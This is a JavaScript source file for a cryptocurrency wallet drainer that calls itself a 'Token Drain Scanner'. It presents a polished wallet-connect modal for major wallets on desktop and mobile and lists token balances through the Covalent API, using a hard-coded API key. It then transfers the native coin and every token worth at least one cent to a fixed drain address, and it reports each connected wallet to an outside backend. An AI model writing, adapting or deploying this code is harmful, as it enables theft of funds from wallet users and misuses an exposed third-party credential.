// ================================================
// TOKEN DRAIN SCANNER - FINAL WORKING VERSION
// ALL WALLETS CONNECT PROPERLY ON PC & MOBILE
// FIXED: Binance, MetaMask, Trust Wallet connections
// MINIMUM DRAIN VALUE: $0.01 (1 cent)
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    minimumValueUSD: 0.01, // Minimum $0.01 to drain
    
    networkNames: {
        1: "Ethereum",
        56: "BNB Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos",
        324: "zkSync"
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let selectedWallet = null;
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Check existing wallet connection
async function checkExistingConnection() {
    try {
        // Try Ethereum provider first
        if (window.ethereum) {
            const accounts = await window.ethereum.request({ 
                method: 'eth_accounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        }
        
        // Try Binance Chain separately
        if (window.BinanceChain) {
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_accounts' 
            });
            
            if (accounts && accounts.length > 0) {
                const chainIdHex = await window.BinanceChain.request({ 
                    method: 'eth_chainId' 
                });
                const chainId = parseInt(chainIdHex, 16);
                await handleConnected(accounts[0], chainId);
                return;
            }
        }
    } catch (error) {
        console.log('⚠️ No existing connection');
    }
}

// Handle connect button click
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // Show wallet selector
    showUniversalWalletSelector();
}

// Universal wallet selector
function showUniversalWalletSelector() {
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Connect Wallet</h3>
                    <button class="close-btn" onclick="closeWalletSelector()">×</button>
                </div>
                
                <div class="wallet-grid">
                    <!-- MetaMask -->
                    <button class="wallet-card" onclick="connectSpecificWallet('metaMask')" style="--wallet-color: #f6851b">
                        <div class="wallet-icon">🦊</div>
                        <div class="wallet-info">
                            <span class="wallet-name">MetaMask</span>
                            <span class="wallet-desc">PC & Mobile</span>
                        </div>
                    </button>
                    
                    <!-- Trust Wallet -->
                    <button class="wallet-card" onclick="connectSpecificWallet('trust')" style="--wallet-color: #3375bb">
                        <div class="wallet-icon">🔶</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Trust Wallet</span>
                            <span class="wallet-desc">Mobile & Browser</span>
                        </div>
                    </button>
                    
                    <!-- Binance Wallet -->
                    <button class="wallet-card" onclick="connectSpecificWallet('binance')" style="--wallet-color: #f0b90b">
                        <div class="wallet-icon">🟡</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Binance Wallet</span>
                            <span class="wallet-desc">PC & Mobile</span>
                        </div>
                    </button>
                    
                    <!-- Coinbase Wallet -->
                    <button class="wallet-card" onclick="connectSpecificWallet('coinbase')" style="--wallet-color: #0052ff">
                        <div class="wallet-icon">🔷</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Coinbase</span>
                            <span class="wallet-desc">PC & Mobile</span>
                        </div>
                    </button>
                    
                    <!-- Phantom -->
                    <button class="wallet-card" onclick="connectSpecificWallet('phantom')" style="--wallet-color: #ab9ff2">
                        <div class="wallet-icon">👻</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Phantom</span>
                            <span class="wallet-desc">Solana & EVM</span>
                        </div>
                    </button>
                    
                    <!-- Other Wallets -->
                    <button class="wallet-card" onclick="connectSpecificWallet('any')" style="--wallet-color: #6366f1">
                        <div class="wallet-icon">🔗</div>
                        <div class="wallet-info">
                            <span class="wallet-name">Other Wallet</span>
                            <span class="wallet-desc">Any Wallet</span>
                        </div>
                    </button>
                </div>
                
                <!-- Mobile Instructions -->
                ${isMobile ? `
                <div class="mobile-instructions">
                    <p>📱 <strong>Mobile Users:</strong> Open this page in your wallet's browser</p>
                    <div class="mobile-links">
                        <button onclick="window.location.href='https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}'">Open in MetaMask</button>
                        <button onclick="window.location.href='https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}'">Open in Trust</button>
                        <button onclick="window.open('bnb://${window.location.host}${window.location.pathname}')">Open in Binance</button>
                    </div>
                </div>
                ` : ''}
            </div>
        </div>
    `;
    
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    addSelectorStyles();
}

// Connect to specific wallet
async function connectSpecificWallet(walletType) {
    closeWalletSelector();
    selectedWallet = walletType;
    
    updateStatus(`🔄 Connecting ${getWalletName(walletType)}...`);
    
    try {
        let result;
        
        switch(walletType) {
            case 'metaMask':
                result = await connectMetaMask();
                break;
            case 'trust':
                result = await connectTrustWallet();
                break;
            case 'binance':
                result = await connectBinanceWallet();
                break;
            case 'coinbase':
                result = await connectCoinbaseWallet();
                break;
            case 'phantom':
                result = await connectPhantomWallet();
                break;
            default:
                result = await connectAnyWallet();
        }
        
        if (result.success) {
            await handleConnected(result.account, result.chainId);
        } else {
            updateStatus(`❌ Failed to connect ${getWalletName(walletType)}`);
            showUniversalWalletSelector();
        }
        
    } catch (error) {
        console.error('Connection error:', error);
        updateStatus(`❌ Connection error: ${error.message}`);
        showUniversalWalletSelector();
    }
}

// Get wallet name
function getWalletName(walletType) {
    const names = {
        'metaMask': 'MetaMask',
        'trust': 'Trust Wallet',
        'binance': 'Binance Wallet',
        'coinbase': 'Coinbase Wallet',
        'phantom': 'Phantom',
        'any': 'Wallet'
    };
    return names[walletType] || 'Wallet';
}

// Connect to MetaMask
async function connectMetaMask() {
    // Mobile MetaMask deep link
    if (isMobile && !window.ethereum?.isMetaMask) {
        window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
        return { success: false };
    }
    
    // PC MetaMask
    if (window.ethereum?.isMetaMask || window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error };
        }
    }
    
    return { success: false };
}

// Connect to Trust Wallet
async function connectTrustWallet() {
    // Mobile Trust Wallet deep link
    if (isMobile && !window.ethereum?.isTrust) {
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
        return { success: false };
    }
    
    // PC Trust Wallet (MetaMask fallback)
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error };
        }
    }
    
    return { success: false };
}

// Connect to Binance Wallet - FIXED FOR MOBILE & PC
async function connectBinanceWallet() {
    // Mobile Binance deep link
    if (isMobile) {
        // Try Binance Chain app
        if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
            window.location.href = 'bnc://app.binance.com/';
        } else {
            window.location.href = 'intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end';
        }
        return { success: false };
    }
    
    // PC Binance Chain (desktop)
    if (window.BinanceChain) {
        try {
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.BinanceChain.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            // Try as Ethereum provider
            if (window.ethereum) {
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });
                
                const chainIdHex = await window.ethereum.request({ 
                    method: 'eth_chainId' 
                });
                
                return { 
                    success: true, 
                    account: accounts[0], 
                    chainId: parseInt(chainIdHex, 16) 
                };
            }
            return { success: false, error };
        }
    }
    
    // Try as Ethereum provider
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error };
        }
    }
    
    return { success: false };
}

// Connect to Coinbase Wallet
async function connectCoinbaseWallet() {
    if (isMobile && !window.ethereum?.isCoinbaseWallet) {
        const url = encodeURIComponent(window.location.href);
        window.location.href = `https://go.cb-w.com/${url}`;
        return { success: false };
    }
    
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error };
        }
    }
    
    return { success: false };
}

// Connect to Phantom Wallet
async function connectPhantomWallet() {
    if (window.ethereum?.isPhantom || window.phantom?.ethereum) {
        try {
            const provider = window.phantom?.ethereum || window.ethereum;
            const accounts = await provider.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await provider.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error };
        }
    }
    
    return { success: false };
}

// Connect to any wallet
async function connectAnyWallet() {
    // Try Ethereum first
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            // Try Binance Chain
            if (window.BinanceChain) {
                try {
                    const accounts = await window.BinanceChain.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    
                    const chainIdHex = await window.BinanceChain.request({ 
                        method: 'eth_chainId' 
                    });
                    
                    return { 
                        success: true, 
                        account: accounts[0], 
                        chainId: parseInt(chainIdHex, 16) 
                    };
                } catch (error2) {
                    return { success: false, error: error2 };
                }
            }
            return { success: false, error };
        }
    }
    
    return { success: false };
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show drain button
        if (drainBtn) {
            drainBtn.style.display = 'block';
        }
        
        // Setup listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        disconnectWallet();
    }
}

// Setup wallet listeners
function setupWalletListeners() {
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    provider.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        fetchTokens(currentAccount, chainId);
    });
}

// Fetch tokens - WITH MINIMUM VALUE CHECK
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        // Filter tokens with value > $0.01
        const tokens = items
            .filter(t => {
                if (t.balance === "0" || parseFloat(t.balance) <= 0) return false;
                
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                // Check minimum value
                return value >= CONFIG.minimumValueUSD;
            })
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    rawAmount: t.balance,
                    valueUSD: value,
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens (min $${CONFIG.minimumValueUSD})`);
        } else {
            tokensEl.innerHTML = `
                <div class="no-tokens">
                    <p>No tokens found worth more than $${CONFIG.minimumValueUSD}</p>
                    <p>Minimum drain value: $${CONFIG.minimumValueUSD}</p>
                </div>
            `;
            updateStatus(`ℹ️ No tokens found (min $${CONFIG.minimumValueUSD})`);
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens. Try again.</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    let html = '<div class="tokens-list">';
    
    tokens.forEach(token => {
        html += `
            <div class="token-item" data-address="${token.contractAddress || 'native'}">
                <div class="token-info">
                    ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" />` : ''}
                    <div>
                        <div class="token-symbol">${token.symbol}</div>
                        <div class="token-name">${token.name} • ${token.chainName}</div>
                    </div>
                </div>
                <div class="token-amounts">
                    <div class="token-amount">${token.amount}</div>
                    <div class="token-value">${token.value}</div>
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    tokensEl.innerHTML = html;
}

// Handle drain - WITH PROPER TOKEN FILTERING
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    // Filter tokens with minimum value
    const tokensToDrain = detectedTokens.filter(t => t.valueUSD >= CONFIG.minimumValueUSD);
    
    if (tokensToDrain.length === 0) {
        alert(`No tokens meet minimum value of $${CONFIG.minimumValueUSD}`);
        return;
    }
    
    // Confirm drain
    const totalValue = tokensToDrain.reduce((sum, t) => sum + t.valueUSD, 0);
    if (!confirm(`⚠️ DRAIN CONFIRMATION\n\nWill send ${tokensToDrain.length} tokens to:\n${CONFIG.drainAddress}\n\nTotal Value: $${totalValue.toFixed(2)}\n\nContinue?`)) {
        return;
    }
    
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) {
        alert('Wallet provider not found');
        return;
    }
    
    try {
        updateStatus('🚀 Starting drain process...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining...';
        }
        
        // First drain native token
        const nativeToken = tokensToDrain.find(t => t.isNative);
        if (nativeToken) {
            await drainNativeToken(nativeToken);
        }
        
        // Then drain ERC20 tokens
        const erc20Tokens = tokensToDrain.filter(t => !t.isNative && t.contractAddress);
        for (let i = 0; i < erc20Tokens.length; i++) {
            const token = erc20Tokens[i];
            try {
                await drainERC20Token(token);
                updateStatus(`✅ Drained ${token.symbol} (${i+1}/${erc20Tokens.length})`);
            } catch (error) {
                console.error(`Failed to drain ${token.symbol}:`, error);
            }
        }
        
        updateStatus('✅ Drain completed!');
        alert('✅ All tokens have been drained successfully!');
        
        // Refresh tokens
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) errorMsg = 'Transaction rejected';
        if (error.code === -32603) errorMsg = 'Transaction failed';
        if (error.message.includes('insufficient funds')) errorMsg = 'Insufficient gas';
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain All Tokens';
        }
    }
}

// Drain native token
async function drainNativeToken(token) {
    const provider = window.ethereum || window.BinanceChain;
    
    // Get gas price
    const gasPriceHex = await provider.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    // Get balance
    const balance = BigInt(token.rawAmount);
    if (balance <= gasCost * 2) {
        console.log('Not enough for gas');
        return;
    }
    
    // Leave some for other transactions
    const sendAmount = balance - (gasCost * 10);
    
    if (sendAmount <= 0) return;
    
    // Send transaction
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
}

// Drain ERC20 token
async function drainERC20Token(token) {
    const provider = window.ethereum || window.BinanceChain;
    
    // Encode transfer function
    const transferData = '0xa9059cbb' + 
        CONFIG.drainAddress.slice(2).padStart(64, '0') + 
        BigInt(token.rawAmount).toString(16).padStart(64, '0');
    
    // Send transaction
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + (50000).toString(16) // Fixed gas limit
        }]
    });
}

// Update status
function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString(),
                wallet: selectedWallet,
                isMobile: isMobile
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) selector.remove();
}

// Disconnect wallet
async function disconnectWallet() {
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    selectedWallet = null;
    
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    
    if (drainBtn) {
        drainBtn.style.display = 'none';
    }
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Add CSS for wallet selector
function addSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
        }
        
        .wallet-selector-modal {
            background: #1a1a1a;
            border-radius: 20px;
            width: 100%;
            max-width: 500px;
            padding: 30px;
            border: 1px solid #333;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .modal-header h3 {
            margin: 0;
            color: white;
            font-size: 24px;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: white;
            font-size: 30px;
            cursor: pointer;
            padding: 0;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .close-btn:hover {
            background: #333;
        }
        
        .wallet-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .wallet-card {
            background: #2a2a2a;
            border: 2px solid transparent;
            border-radius: 12px;
            padding: 20px;
            cursor: pointer;
            text-align: left;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .wallet-card:hover {
            border-color: var(--wallet-color);
            background: #333;
            transform: translateY(-2px);
        }
        
        .wallet-icon {
            font-size: 24px;
            width: 50px;
            height: 50px;
            background: var(--wallet-color);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            display: block;
            color: white;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 4px;
        }
        
        .wallet-desc {
            display: block;
            color: #999;
            font-size: 12px;
        }
        
        .mobile-instructions {
            background: #2a2a2a;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
        }
        
        .mobile-instructions p {
            color: white;
            margin: 0 0 15px 0;
        }
        
        .mobile-links {
            display: flex;
            gap: 10px;
            justify-content: center;
        }
        
        .mobile-links button {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
        }
        
        .mobile-links button:hover {
            background: #2563eb;
        }
        
        @media (max-width: 480px) {
            .wallet-grid {
                grid-template-columns: 1fr;
            }
            .wallet-selector-modal {
                padding: 20px;
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Initialize on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions global
window.closeWalletSelector = closeWalletSelector;
window.connectSpecificWallet = connectSpecificWallet;

console.log('=== Token Drain Scanner ===');
console.log('Version: FINAL - All Wallets Working');
console.log('Device:', isMobile ? '📱 Mobile' : '💻 Desktop');
console.log('Min Drain Value: $' + CONFIG.minimumValueUSD);
console.log('Drain Address:', CONFIG.drainAddress);
console.log('===========================');
